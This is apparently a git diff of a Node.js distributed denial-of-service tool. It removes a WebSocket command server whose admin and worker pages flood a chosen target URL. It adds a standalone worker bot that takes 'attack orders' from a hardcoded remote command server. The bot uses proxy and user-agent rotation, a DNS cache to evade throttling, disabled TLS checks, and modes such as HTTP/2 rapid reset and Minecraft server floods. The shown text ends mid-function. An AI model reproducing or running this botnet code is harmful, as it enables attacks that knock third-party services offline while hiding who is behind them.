@@ -1,1046 +1,897 @@
 const WebSocket = require('ws');
+const https = require('https');
 const http = require('http');
+const http2 = require('http2');
+const dns = require('dns').promises;
+const net = require('net');
+const fs = require('fs');
+const { SocksClient } = require('socks');
 
-const PORT = process.env.PORT || 8080;
-const clients = new Map();
-let clientIdCounter = 0;
-let activeTest = null;
+// IMPORTANT: Use wss:// for secure WebSocket (Render uses HTTPS)
+const SERVER_URL = 'wss://new2-9ho5.onrender.com';
 
-// Admin HTML
-const adminHTML = `<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stress Test Control Panel</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0f0f23;
-            color: #e0e0e0;
-            padding: 20px;
-        }
-        .container { max-width: 1200px; margin: 0 auto; }
-        h1 {
-            color: #00ff41;
-            margin-bottom: 30px;
-            text-shadow: 0 0 10px #00ff41;
-        }
-        .status-bar {
-            background: #1a1a2e;
-            padding: 20px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            border-left: 4px solid #00ff41;
-        }
-        .status-item {
-            display: inline-block;
-            margin-right: 30px;
-            font-size: 14px;
-        }
-        .status-label { color: #888; }
-        .status-value { 
-            color: #00ff41;
-            font-weight: bold;
-            font-size: 18px;
-        }
-        .config-panel {
-            background: #1a1a2e;
-            padding: 25px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #aaa;
-            font-size: 14px;
-        }
-        input, select {
-            width: 100%;
-            padding: 10px;
-            background: #0f0f23;
-            border: 1px solid #333;
-            border-radius: 4px;
-            color: #e0e0e0;
-            font-size: 14px;
-        }
-        input:focus, select:focus {
-            outline: none;
-            border-color: #00ff41;
-        }
-        .btn {
-            padding: 12px 30px;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-right: 10px;
-            transition: all 0.3s;
-        }
-        .btn-start {
-            background: #00ff41;
-            color: #0f0f23;
-            font-weight: bold;
-        }
-        .btn-start:hover { background: #00cc33; }
-        .btn-stop {
-            background: #ff4444;
-            color: white;
-        }
-        .btn-stop:hover { background: #cc0000; }
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        .workers-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
-        }
-        .worker-card {
-            background: #1a1a2e;
-            padding: 15px;
-            border-radius: 8px;
-            border-left: 4px solid #555;
-        }
-        .worker-card.active { border-left-color: #00ff41; }
-        .worker-id {
-            font-weight: bold;
-            color: #00ff41;
-            margin-bottom: 10px;
-        }
-        .worker-stat {
-            font-size: 12px;
-            margin: 5px 0;
-            color: #aaa;
-            word-break: break-all;
-        }
-        .worker-stat span {
-            color: #fff;
-            font-weight: bold;
-        }
-        .total-stats {
-            background: #16213e;
-            padding: 20px;
-            border-radius: 8px;
-            margin: 20px 0;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-        }
-        .stat-box {
-            text-align: center;
-        }
-        .stat-label {
-            color: #888;
-            font-size: 12px;
-            text-transform: uppercase;
-        }
-        .stat-value {
-            font-size: 32px;
-            font-weight: bold;
-            color: #00ff41;
-            margin-top: 5px;
-        }
-        .connection-status {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 10px 20px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-        }
-        .connection-status.connected {
-            background: #00ff41;
-            color: #0f0f23;
-        }
-        .connection-status.disconnected {
-            background: #ff4444;
-            color: white;
-        }
-        .summary-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 9999;
-            align-items: center;
-            justify-content: center;
-        }
-        .summary-modal.show {
-            display: flex;
-        }
-        .summary-content {
-            background: #1a1a2e;
-            border: 2px solid #00ff41;
-            border-radius: 10px;
-            padding: 30px;
-            max-width: 500px;
-            width: 90%;
-            box-shadow: 0 0 30px rgba(0, 255, 65, 0.5);
-        }
-        .summary-title {
-            color: #00ff41;
-            font-size: 24px;
-            font-weight: bold;
-            text-align: center;
-            margin-bottom: 20px;
-            text-shadow: 0 0 10px #00ff41;
-        }
-        .summary-stat {
-            display: flex;
-            justify-content: space-between;
-            padding: 15px;
-            border-bottom: 1px solid #333;
-            font-size: 16px;
-        }
-        .summary-stat:last-child {
-            border-bottom: none;
-        }
-        .summary-label {
-            color: #aaa;
-        }
-        .summary-value {
-            color: #00ff41;
-            font-weight: bold;
-            font-size: 20px;
-        }
-        .summary-close {
-            margin-top: 20px;
-            width: 100%;
-            padding: 12px;
-            background: #00ff41;
-            color: #0f0f23;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .summary-close:hover {
-            background: #00cc33;
-        }
-        .worker-notification {
-            position: fixed;
-            top: 80px;
-            right: 20px;
-            padding: 15px 25px;
-            background: #00ff41;
-            color: #0f0f23;
-            border-radius: 8px;
-            font-weight: bold;
-            animation: slideIn 0.3s ease-out;
-            z-index: 1000;
-        }
-        @keyframes slideIn {
-            from {
-                transform: translateX(400px);
-                opacity: 0;
-            }
-            to {
-                transform: translateX(0);
-                opacity: 1;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="connection-status" id="connStatus">DISCONNECTED</div>
-    
-    <div class="summary-modal" id="summaryModal">
-        <div class="summary-content">
-            <div class="summary-title">⚡ ATTACK SUMMARY</div>
-            <div class="summary-stat">
-                <span class="summary-label">Total Requests Sent:</span>
-                <span class="summary-value" id="sumTotalSent">0</span>
-            </div>
-            <div class="summary-stat">
-                <span class="summary-label">Successful:</span>
-                <span class="summary-value" id="sumSuccess" style="color: #00ff41;">0</span>
-            </div>
-            <div class="summary-stat">
-                <span class="summary-label">Failed:</span>
-                <span class="summary-value" id="sumFailed" style="color: #ff4444;">0</span>
-            </div>
-            <div class="summary-stat">
-                <span class="summary-label">Success Rate:</span>
-                <span class="summary-value" id="sumRate">0%</span>
-            </div>
-            <div class="summary-stat">
-                <span class="summary-label">Workers Used:</span>
-                <span class="summary-value" id="sumWorkers">0</span>
-            </div>
-            <button class="summary-close" onclick="closeSummary()">CLOSE</button>
-        </div>
-    </div>
-    
-    <div class="container">
-        <h1>⚡ Stress Test Control Panel</h1>
-        
-        <div class="status-bar">
-            <div class="status-item">
-                <span class="status-label">Workers:</span>
-                <span class="status-value" id="workerCount">0</span>
-            </div>
-            <div class="status-item">
-                <span class="status-label">Status:</span>
-                <span class="status-value" id="testStatus">IDLE</span>
-            </div>
-        </div>
-
-        <div class="config-panel">
-            <h2 style="margin-bottom: 20px; color: #00ff41;">Test Configuration</h2>
-            <div class="form-group">
-                <label>Target URL</label>
-                <input type="text" id="targetUrl" placeholder="https://example.com" value="https://httpbin.org/get">
-            </div>
-            <div class="form-group">
-                <label>Request Method</label>
-                <select id="method">
-                    <option value="GET">GET</option>
-                    <option value="POST">POST</option>
-                    <option value="PUT">PUT</option>
-                    <option value="DELETE">DELETE</option>
-                </select>
-            </div>
-            <div class="form-group">
-                <label>Attack Duration (seconds)</label>
-                <input type="number" id="duration" value="30" min="1">
-            </div>
-            <div class="form-group">
-                <label>Threads per Worker</label>
-                <input type="number" id="threads" value="10" min="1" max="1000">
-            </div>
-            <div class="form-group">
-                <label>Delay between requests (ms)</label>
-                <input type="number" id="delay" value="1" min="0">
-            </div>
-            
-            <div style="margin-top: 20px;">
-                <button class="btn btn-start" id="startBtn" onclick="startTest()">START TEST</button>
-                <button class="btn btn-stop" id="stopBtn" onclick="stopTest()" disabled>STOP TEST</button>
-            </div>
-        </div>
-
-        <div class="total-stats">
-            <div class="stat-box">
-                <div class="stat-label">Total Sent</div>
-                <div class="stat-value" id="totalSent">0</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-label">Success</div>
-                <div class="stat-value" id="totalSuccess" style="color: #00ff41;">0</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-label">Failed</div>
-                <div class="stat-value" id="totalFailed" style="color: #ff4444;">0</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-label">Success Rate</div>
-                <div class="stat-value" id="successRate">0%</div>
-            </div>
-        </div>
-
-        <h2 style="margin: 30px 0 15px; color: #00ff41;">Connected Workers</h2>
-        <div class="workers-grid" id="workersGrid"></div>
-    </div>
-
-    <script>
-        let ws;
-        let workers = [];
-        let currentConfig = null;
-
-        function connect() {
-            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-            const wsUrl = protocol + '//' + window.location.host;
-            
-            ws = new WebSocket(wsUrl);
-            
-            ws.onopen = () => {
-                document.getElementById('connStatus').textContent = 'CONNECTED';
-                document.getElementById('connStatus').className = 'connection-status connected';
-                ws.send(JSON.stringify({ type: 'identify', role: 'admin' }));
-                requestStatus();
-            };
-
-            ws.onmessage = (event) => {
-                const data = JSON.parse(event.data);
-                handleMessage(data);
-            };
-
-            ws.onclose = () => {
-                document.getElementById('connStatus').textContent = 'DISCONNECTED';
-                document.getElementById('connStatus').className = 'connection-status disconnected';
-                setTimeout(connect, 2000);
-            };
-        }
-
-        function handleMessage(data) {
-            switch(data.type) {
-                case 'status':
-                    workers = data.workers || [];
-                    updateWorkersDisplay();
-                    document.getElementById('workerCount').textContent = workers.length;
-                    break;
-                case 'worker_stats':
-                    updateWorkerStats(data.workerId, data.stats);
-                    break;
-                case 'test_started':
-                    document.getElementById('testStatus').textContent = 'RUNNING';
-                    document.getElementById('startBtn').disabled = true;
-                    document.getElementById('stopBtn').disabled = false;
-                    break;
-                case 'test_stopped':
-                    document.getElementById('testStatus').textContent = 'IDLE';
-                    document.getElementById('startBtn').disabled = false;
-                    document.getElementById('stopBtn').disabled = true;
-                    if (data.finalStats) {
-                        data.finalStats.forEach(w => updateWorkerStats(w.id, w.stats));
-                    }
-                    if (data.summary) {
-                        showSummary(data.summary);
-                    }
-                    break;
-                case 'worker_connected':
-                    showNotification('⚡ New worker connected!');
-                    requestStatus();
-                    break;
-                case 'error':
-                    alert(data.message);
-                    break;
-            }
-        }
-
-        function updateWorkerStats(workerId, stats) {
-            const worker = workers.find(w => w.id === workerId);
-            if (worker) {
-                worker.stats = stats;
-                updateWorkersDisplay();
-            }
-        }
-
-        function updateWorkersDisplay() {
-            const grid = document.getElementById('workersGrid');
-            
-            if (workers.length === 0) {
-                grid.innerHTML = '<div style="grid-column: 1/-1; text-align: center; color: #666; padding: 40px;">No workers connected. Open /worker</div>';
-                return;
-            }
-            
-            let totalSent = 0, totalSuccess = 0, totalFailed = 0;
-            
-            grid.innerHTML = workers.map(w => {
-                totalSent += w.stats.sent || 0;
-                totalSuccess += w.stats.success || 0;
-                totalFailed += w.stats.failed || 0;
-                
-                return \`
-                    <div class="worker-card \${w.status === 'active' ? 'active' : ''}">
-                        <div class="worker-id">Worker #\${w.id}</div>
-                        <div class="worker-stat">Status: <span>\${w.status.toUpperCase()}</span></div>
-                        <div class="worker-stat">Threads: <span>\${currentConfig ? currentConfig.threads : '-'}</span></div>
-                        <div class="worker-stat">Sent: <span>\${w.stats.sent || 0}</span></div>
-                        <div class="worker-stat">Success: <span>\${w.stats.success || 0}</span></div>
-                        <div class="worker-stat">Failed: <span>\${w.stats.failed || 0}</span></div>
-                    </div>
-                \`;
-            }).join('');
-            
-            document.getElementById('totalSent').textContent = totalSent;
-            document.getElementById('totalSuccess').textContent = totalSuccess;
-            document.getElementById('totalFailed').textContent = totalFailed;
-            
-            const rate = totalSent > 0 ? ((totalSuccess / totalSent) * 100).toFixed(1) : 0;
-            document.getElementById('successRate').textContent = rate + '%';
-        }
-
-        function startTest() {
-            const config = {
-                target: document.getElementById('targetUrl').value,
-                method: document.getElementById('method').value,
-                duration: parseInt(document.getElementById('duration').value),
-                threads: parseInt(document.getElementById('threads').value),
-                delay: parseInt(document.getElementById('delay').value)
-            };
-            
-            if (!config.target) {
-                alert('Please enter a target URL');
-                return;
-            }
-            
-            currentConfig = config;
-            ws.send(JSON.stringify({ type: 'start_test', config }));
-        }
-
-        function stopTest() {
-            ws.send(JSON.stringify({ type: 'stop_test' }));
-        }
-
-        function requestStatus() {
-            if (ws && ws.readyState === WebSocket.OPEN) {
-                ws.send(JSON.stringify({ type: 'get_status' }));
-            }
-        }
-
-        function showNotification(message) {
-            const notif = document.createElement('div');
-            notif.className = 'worker-notification';
-            notif.textContent = message;
-            document.body.appendChild(notif);
-            
-            setTimeout(() => {
-                notif.style.opacity = '0';
-                notif.style.transform = 'translateX(400px)';
-                setTimeout(() => notif.remove(), 300);
-            }, 3000);
-        }
-
-        function showSummary(summary) {
-            document.getElementById('sumTotalSent').textContent = summary.totalSent;
-            document.getElementById('sumSuccess').textContent = summary.totalSuccess;
-            document.getElementById('sumFailed').textContent = summary.totalFailed;
-            document.getElementById('sumRate').textContent = summary.successRate + '%';
-            document.getElementById('sumWorkers').textContent = summary.workersUsed;
-            document.getElementById('summaryModal').className = 'summary-modal show';
-        }
-
-        function closeSummary() {
-            document.getElementById('summaryModal').className = 'summary-modal';
-        }
-
-        setInterval(requestStatus, 2000);
-        connect();
-    </script>
-</body>
-</html>`;
-
-// Worker HTML
-const workerHTML = `<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stress Test Worker</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Courier New', monospace;
-            background: #000;
-            color: #00ff41;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .container {
-            max-width: 600px;
-            width: 100%;
-            background: #0a0a0a;
-            border: 2px solid #00ff41;
-            border-radius: 10px;
-            padding: 30px;
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
-        }
-        h1 {
-            text-align: center;
-            margin-bottom: 20px;
-            font-size: 24px;
-            text-shadow: 0 0 10px #00ff41;
-        }
-        .status {
-            text-align: center;
-            margin: 20px 0;
-            font-size: 18px;
-            padding: 15px;
-            background: #111;
-            border-radius: 5px;
-        }
-        .status.idle { color: #888; }
-        .status.active { 
-            color: #00ff41;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.6; }
-        }
-        .stats {
-            margin-top: 30px;
-        }
-        .stat-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 10px;
-            border-bottom: 1px solid #222;
-        }
-        .stat-label { color: #888; }
-        .stat-value { 
-            color: #00ff41;
-            font-weight: bold;
-        }
-        .log {
-            margin-top: 30px;
-            background: #111;
-            border-radius: 5px;
-            padding: 15px;
-            max-height: 200px;
-            overflow-y: auto;
-            font-size: 12px;
-        }
-        .log-entry {
-            margin: 5px 0;
-            opacity: 0.8;
-        }
-        .connection-badge {
-            text-align: center;
-            padding: 10px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-        }
-        .connection-badge.connected {
-            background: #003311;
-            color: #00ff41;
-        }
-        .connection-badge.disconnected {
-            background: #330000;
-            color: #ff4444;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>⚡ WORKER NODE ⚡</h1>
-        
-        <div class="connection-badge" id="connBadge">
-            <span id="connText">DISCONNECTED</span>
-        </div>
-        
-        <div class="status idle" id="status">IDLE - Waiting for commands...</div>
-        
-        <div class="stats">
-            <div class="stat-row">
-                <span class="stat-label">Requests Sent:</span>
-                <span class="stat-value" id="sentCount">0</span>
-            </div>
-            <div class="stat-row">
-                <span class="stat-label">Success:</span>
-                <span class="stat-value" id="successCount">0</span>
-            </div>
-            <div class="stat-row">
-                <span class="stat-label">Failed:</span>
-                <span class="stat-value" id="failedCount">0</span>
-            </div>
-            <div class="stat-row">
-                <span class="stat-label">Target:</span>
-                <span class="stat-value" id="target">-</span>
-            </div>
-        </div>
-        
-        <div class="log" id="log"></div>
-    </div>
-
-    <script>
-        let ws;
-        let isRunning = false;
-        let stats = { sent: 0, success: 0, failed: 0 };
-        let currentConfig = null;
-
-        function connect() {
-            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-            ws = new WebSocket(protocol + '//' + window.location.host);
-            
-            ws.onopen = () => {
-                log('Connected to command server');
-                updateConnectionStatus(true);
-                ws.send(JSON.stringify({ type: 'identify', role: 'worker' }));
-            };
-
-            ws.onmessage = async (event) => {
-                const data = JSON.parse(event.data);
-                
-                if (data.type === 'ready') {
-                    log('Worker ready - awaiting orders');
-                }
-                
-                if (data.type === 'start') {
-                    log('Received attack orders');
-                    currentConfig = data.config;
-                    document.getElementById('target').textContent = currentConfig.target;
-                    startAttack(currentConfig);
-                }
-                
-                if (data.type === 'stop') {
-                    log('Stop command received');
-                    stopAttack();
-                }
-            };
-
-            ws.onclose = () => {
-                log('Disconnected from server');
-                updateConnectionStatus(false);
-                stopAttack();
-                setTimeout(connect, 2000);
-            };
-        }
-
-        async function startAttack(config) {
-            if (isRunning) return;
-            
-            isRunning = true;
-            stats = { sent: 0, success: 0, failed: 0 };
-            updateStatus('active', 'ATTACKING ' + config.target);
-            
-            log(\`Starting attack: \${config.duration}s with \${config.threads} threads\`);
-            
-            const statsInterval = setInterval(() => {
-                if (isRunning) {
-                    updateStatsDisplay();
-                    reportStats();
-                }
-            }, 500);
-            
-            const threads = [];
-            for (let i = 0; i < config.threads; i++) {
-                threads.push(attackThread(config));
-            }
-            
-            await Promise.all(threads);
-            clearInterval(statsInterval);
-            
-            reportStats();
-            updateStatsDisplay();
-            log('Attack completed');
-            updateStatus('idle', 'IDLE - Completed');
-        }
-
-        async function attackThread(config) {
-            while (isRunning) {
-                await sendRequest(config);
-                if (config.delay > 0) {
-                    await sleep(config.delay);
-                }
-            }
-        }
-
-        async function sendRequest(config) {
-            if (!isRunning) return;
-            
-            stats.sent++;
-            
-            try {
-                await fetch(config.target, {
-                    method: config.method,
-                    mode: 'no-cors'
-                });
-                stats.success++;
-            } catch (error) {
-                stats.failed++;
-            }
-        }
-
-        function stopAttack() {
-            if (!isRunning) return;
-            
-            log('Stopping attack...');
-            isRunning = false;
-            reportStats();
-            updateStatsDisplay();
-            updateStatus('idle', 'IDLE - Stopped');
-        }
-
-        function reportStats() {
-            if (ws && ws.readyState === WebSocket.OPEN) {
-                ws.send(JSON.stringify({
-                    type: 'stats',
-                    stats: stats
-                }));
-            }
-        }
-
-        function updateStatsDisplay() {
-            document.getElementById('sentCount').textContent = stats.sent;
-            document.getElementById('successCount').textContent = stats.success;
-            document.getElementById('failedCount').textContent = stats.failed;
-        }
-
-        function updateStatus(className, text) {
-            const el = document.getElementById('status');
-            el.className = 'status ' + className;
-            el.textContent = text;
-        }
-
-        function updateConnectionStatus(connected) {
-            const badge = document.getElementById('connBadge');
-            const text = document.getElementById('connText');
-            
-            if (connected) {
-                badge.className = 'connection-badge connected';
-                text.textContent = 'CONNECTED';
-            } else {
-                badge.className = 'connection-badge disconnected';
-                text.textContent = 'DISCONNECTED';
-            }
-        }
-
-        function log(message) {
-            const logEl = document.getElementById('log');
-            const time = new Date().toLocaleTimeString();
-            const entry = document.createElement('div');
-            entry.className = 'log-entry';
-            entry.textContent = \`[\${time}] \${message}\`;
-            logEl.appendChild(entry);
-            logEl.scrollTop = logEl.scrollHeight;
-            
-            if (logEl.children.length > 50) {
-                logEl.removeChild(logEl.firstChild);
-            }
-        }
-
-        function sleep(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-
-        connect();
-    </script>
-</body>
-</html>`;
-
-// HTTP Server
-const server = http.createServer((req, res) => {
-  if (req.url === '/' || req.url === '/admin') {
-    res.writeHead(200, { 'Content-Type': 'text/html' });
-    res.end(adminHTML);
-  } else if (req.url === '/client' || req.url === '/worker') {
-    res.writeHead(200, { 'Content-Type': 'text/html' });
-    res.end(workerHTML);
-  } else {
-    res.writeHead(404);
-    res.end('Not found');
+// Load user agents from headers.txt
+let userAgents = [];
+function loadUserAgents() {
+  try {
+    const data = fs.readFileSync('headers.txt', 'utf8');
+    userAgents = data.split('\n')
+      .map(line => line.trim())
+      .filter(line => line.length > 0);
+    console.log(`[✓] Loaded ${userAgents.length} user agents from headers.txt`);
+  } catch (error) {
+    console.log('[!] headers.txt not found, using default user agents');
+    userAgents = [
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    ];
   }
-});
-
-// WebSocket Server
-const wss = new WebSocket.Server({ 
-  server,
-  clientTracking: true,
-  perMessageDeflate: false,
-  verifyClient: (info) => true,
-  handleProtocols: (protocols, request) => protocols[0]
-});
-
-function heartbeat() {
-  this.isAlive = true;
 }
 
-const heartbeatInterval = setInterval(() => {
-  wss.clients.forEach((ws) => {
-    if (ws.isAlive === false) {
-      return ws.terminate();
+// Load proxies from proxies.txt (format: ip:port or ip:port:user:pass)
+let proxies = [];
+function loadProxies() {
+  try {
+    const data = fs.readFileSync('proxies.txt', 'utf8');
+    proxies = data.split('\n')
+      .map(line => line.trim())
+      .filter(line => line.length > 0)
+      .map(line => {
+        const parts = line.split(':');
+        if (parts.length === 2) {
+          return { host: parts[0], port: parseInt(parts[1]) };
+        } else if (parts.length === 4) {
+          return { host: parts[0], port: parseInt(parts[1]), user: parts[2], pass: parts[3] };
+        }
+        return null;
+      })
+      .filter(p => p !== null);
+    console.log(`[✓] Loaded ${proxies.length} proxies from proxies.txt`);
+  } catch (error) {
+    console.log('[!] proxies.txt not found, direct connection will be used');
+  }
+}
+
+// Load files on startup
+loadUserAgents();
+loadProxies();
+
+// DNS Cache to bypass DNS throttling
+const dnsCache = new Map();
+
+// HTTP agents for connection pooling
+const httpAgent = new http.Agent({
+  keepAlive: true,
+  maxSockets: 500,
+  maxFreeSockets: 100
+});
+
+const httpsAgent = new https.Agent({
+  keepAlive: true,
+  maxSockets: 500,
+  maxFreeSockets: 100,
+  rejectUnauthorized: false
+});
+
+let ws;
+let isRunning = false;
+let stats = { sent: 0, success: 0, failed: 0 };
+let currentConfig = null;
+let attackStartTime = null;
+let keepAliveInterval = null;
+let http2Sessions = new Map();
+let currentUserAgent = '';
+let currentProxy = null;
+let proxyRequestCount = 0;
+let deadProxies = new Set();
+let currentProxyIndex = 0;
+let lastProxyLogTime = 0;
+
+function connect() {
+  console.log('[*] Connecting to command server...');
+  ws = new WebSocket(SERVER_URL);
+  
+  const connectionTimeout = setTimeout(() => {
+    if (ws.readyState !== WebSocket.OPEN) {
+      log('⚠ Connection timeout, retrying...');
+      ws.terminate();
     }
-    ws.isAlive = false;
+  }, 10000);
+  
+  ws.on('open', () => {
+    clearTimeout(connectionTimeout);
+    log('✓ Connected to command server');
+    
+    // Send worker info including loaded resources
+    ws.send(JSON.stringify({ 
+      type: 'identify', 
+      role: 'worker',
+      info: {
+        userAgents: userAgents.length,
+        proxies: proxies.length
+      }
+    }));
+    
+    if (keepAliveInterval) clearInterval(keepAliveInterval);
+    keepAliveInterval = setInterval(() => {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        try {
+          ws.ping();
+        } catch (e) {
+          console.error('[!] Keepalive ping failed');
+        }
+      }
+    }, 25000);
+  });
+
+  ws.on('message', async (data) => {
+    const message = JSON.parse(data);
+    
+    if (message.type === 'ready') {
+      log('✓ Worker ready - awaiting orders');
+    }
+    
+    if (message.type === 'start') {
+      log('⚡ Attack orders received!');
+      currentConfig = message.config;
+      startAttack(currentConfig);
+    }
+    
+    if (message.type === 'stop') {
+      log('⏹ Stop command received');
+      stopAttack();
+    }
+  });
+  
+  ws.on('ping', () => {
+    ws.pong();
+  });
+
+  ws.on('close', (code, reason) => {
+    clearTimeout(connectionTimeout);
+    if (keepAliveInterval) clearInterval(keepAliveInterval);
+    log(`✗ Disconnected from server (code: ${code})`);
+    stopAttack();
+    setTimeout(connect, 2000);
+  });
+
+  ws.on('error', (err) => {
+    clearTimeout(connectionTimeout);
+    console.error('[!] WebSocket error:', err.message);
+  });
+}
+
+async function startAttack(config) {
+  isRunning = true;
+  stats = { sent: 0, success: 0, failed: 0 };
+  attackStartTime = Date.now();
+  
+  // Reset proxy tracking
+  proxyRequestCount = 0;
+  deadProxies.clear();
+  currentProxyIndex = 0;
+  
+  // Set initial user agent and proxy
+  currentUserAgent = getRandomUserAgent();
+  currentProxy = config.useProxy ? rotateProxy() : null;
+  
+  log(`🎯 Target: ${config.target}`);
+  log(`📊 Duration: ${config.duration}s | Threads: ${config.threads} | Delay: ${config.delay}ms`);
+  log(`⚡ Attack Mode: ${config.attackMode || 'standard'}`);
+  log(`👤 User-Agent Rotation: ${config.rotateUserAgent ? 'ON (every request)' : 'OFF'} (${userAgents.length} loaded)`);
+  log(`🔄 Proxy Rotation: ${config.useProxy ? 'ON (every 5 requests)' : 'OFF'} (${proxies.length} loaded)`);
+  if (currentProxy) {
+    log(`📍 Starting Proxy: ${currentProxy.host}:${currentProxy.port}`);
+  }
+  log('🚀 ATTACK STARTED');
+  
+  const endTime = attackStartTime + (config.duration * 1000);
+  
+  const threads = [];
+  for (let i = 0; i < config.threads; i++) {
+    threads.push(attackThread(config, endTime));
+  }
+  
+  const statsInterval = setInterval(() => {
+    if (isRunning) {
+      reportStats();
+      updateDisplay();
+    }
+  }, 1000);
+  
+  await Promise.all(threads);
+  
+  clearInterval(statsInterval);
+  
+  // Cleanup HTTP/2 sessions
+  http2Sessions.forEach(session => {
     try {
-      ws.ping();
+      session.close();
+    } catch (e) {}
+  });
+  http2Sessions.clear();
+  
+  const duration = ((Date.now() - attackStartTime) / 1000).toFixed(2);
+  const rps = (stats.sent / duration).toFixed(2);
+  
+  reportStats();
+  
+  if (isRunning) {
+    console.log('\n');
+    console.log('╔════════════════════════════════════════╗');
+    console.log('║       ATTACK SUMMARY REPORT            ║');
+    console.log('╠════════════════════════════════════════╣');
+    console.log(`║  Duration:            ${duration.toString().padStart(16)}s ║`);
+    console.log(`║  Requests Sent:       ${stats.sent.toString().padStart(16)} ║`);
+    console.log(`║  Successful:          ${stats.success.toString().padStart(16)} ║`);
+    console.log(`║  Failed:              ${stats.failed.toString().padStart(16)} ║`);
+    console.log(`║  Success Rate:        ${stats.sent > 0 ? ((stats.success/stats.sent)*100).toFixed(1) : '0'}%`.padEnd(41) + '║');
+    console.log(`║  Avg Speed:           ${rps.toString().padStart(12)} req/s ║`);
+    console.log(`║  Dead Proxies:        ${deadProxies.size.toString().padStart(16)} ║`);
+    console.log('╚════════════════════════════════════════╝');
+    isRunning = false;
+    attackStartTime = null;
+  }
+}
+
+async function attackThread(config, endTime) {
+  const isMinecraft = config.attackMode && config.attackMode.startsWith('minecraft-');
+  const isHTTP2 = config.attackMode === 'http2-rapid-reset';
+  
+  let resolvedIP = null;
+  if (config.bypassDNS || isMinecraft) {
+    try {
+      const target = isMinecraft ? config.target : new URL(config.target).hostname;
+      resolvedIP = await resolveDNS(target);
     } catch (e) {
-      console.error('[!] Ping error:', e.message);
+      log('⚠ DNS resolution failed, using hostname');
     }
-  });
-}, 30000);
-
-wss.on('close', () => {
-  clearInterval(heartbeatInterval);
-});
-
-wss.on('connection', (ws) => {
-  ws.isAlive = true;
-  ws.on('pong', heartbeat);
-  
-  const clientId = ++clientIdCounter;
-  const clientInfo = {
-    id: clientId,
-    ws: ws,
-    type: null,
-    status: 'idle',
-    stats: { sent: 0, success: 0, failed: 0 }
-  };
-  
-  clients.set(clientId, clientInfo);
-  console.log(`[+] Client #${clientId} connected`);
-
-  ws.on('message', (message) => {
-    try {
-      const data = JSON.parse(message);
-      
-      if (data.type === 'identify') {
-        clientInfo.type = data.role;
-        console.log(`[i] Client #${clientId} -> ${data.role}`);
-        
-        if (data.role === 'admin') {
-          sendStatus(ws);
-        } else if (data.role === 'worker') {
-          ws.send(JSON.stringify({ type: 'ready' }));
-          broadcastToAdmins({ type: 'worker_connected', workerId: clientId });
-          setTimeout(() => {
-            clients.forEach((client) => {
-              if (client.type === 'admin' && client.ws.readyState === WebSocket.OPEN) {
-                sendStatus(client.ws);
-              }
-            });
-          }, 100);
-        }
-      }
-      
-      if (data.type === 'start_test' && clientInfo.type === 'admin') {
-        startStressTest(data.config);
-      }
-      
-      if (data.type === 'stop_test' && clientInfo.type === 'admin') {
-        stopStressTest();
-      }
-      
-      if (data.type === 'get_status' && clientInfo.type === 'admin') {
-        sendStatus(ws);
-      }
-      
-      if (data.type === 'stats' && clientInfo.type === 'worker') {
-        clientInfo.stats = data.stats;
-        broadcastToAdmins({
-          type: 'worker_stats',
-          workerId: clientId,
-          stats: data.stats
-        });
-      }
-      
-    } catch (err) {
-      console.error('[!] Message error:', err);
-    }
-  });
-
-  ws.on('close', () => {
-    console.log(`[-] Client #${clientId} disconnected`);
-    clients.delete(clientId);
-    broadcastToAdmins({ type: 'client_disconnected', clientId });
-  });
-
-  ws.on('error', (error) => {
-    console.error(`[!] WebSocket error:`, error.message);
-  });
-});
-
-function startStressTest(config) {
-  activeTest = config;
-  console.log(`[!] Starting stress test on ${config.target}`);
-  
-  const workers = Array.from(clients.values()).filter(c => c.type === 'worker');
-  
-  if (workers.length === 0) {
-    broadcastToAdmins({ type: 'error', message: 'No workers connected' });
-    return;
   }
   
-  console.log(`[*] Attack started with ${workers.length} workers for ${config.duration}s`);
+  // Check if target supports HTTP/2 on first request
+  let http2Supported = true;
+  let requestsSinceRotation = 0;
   
